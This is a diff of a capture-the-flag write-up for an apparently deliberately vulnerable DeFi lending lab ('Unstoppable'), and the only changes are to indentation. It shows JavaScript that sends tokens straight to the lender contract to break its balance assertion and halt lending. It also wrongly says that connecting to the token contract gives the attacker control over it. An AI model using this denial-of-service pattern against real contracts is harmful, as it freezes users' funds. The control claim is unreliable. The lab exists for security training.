@@ -34,7 +34,7 @@ now we need to inspect variable poolBalance:
 ## Best place to exploit
 
 ```solidity
-   assert(poolBalance == balanceBefore);
+assert(poolBalance == balanceBefore);
 ```
 
 ## Exploit
@@ -55,8 +55,8 @@ it("Exploit", async function () {
 const TokenContractExploit = this.token.connect(attacker);
 ```
 
-    This line creates a new instance of the token contract (DamnValuableToken) connected to the attacker account.
-    It allows the attacker account to interact with the token contract, effectively gaining control over it.
+This line creates a new instance of the token contract (DamnValuableToken) connected to the attacker account.
+It allows the attacker account to interact with the token contract, effectively gaining control over it.
 
 ```javascript
 await TokenContractExploit.transfer(
@@ -65,5 +65,5 @@ await TokenContractExploit.transfer(
 );
 ```
 
-    This line initiates a transfer of tokens from the attacker's controlled instance of the token contract to the lending contract (UnstoppableLender).
-    The transferred amount is INITIAL_ATTACKER_TOKEN_BALANCE, which is set to 100 tokens.
+This line initiates a transfer of tokens from the attacker's controlled instance of the token contract to the lending contract (UnstoppableLender).
+The transferred amount is INITIAL_ATTACKER_TOKEN_BALANCE, which is set to 100 tokens.
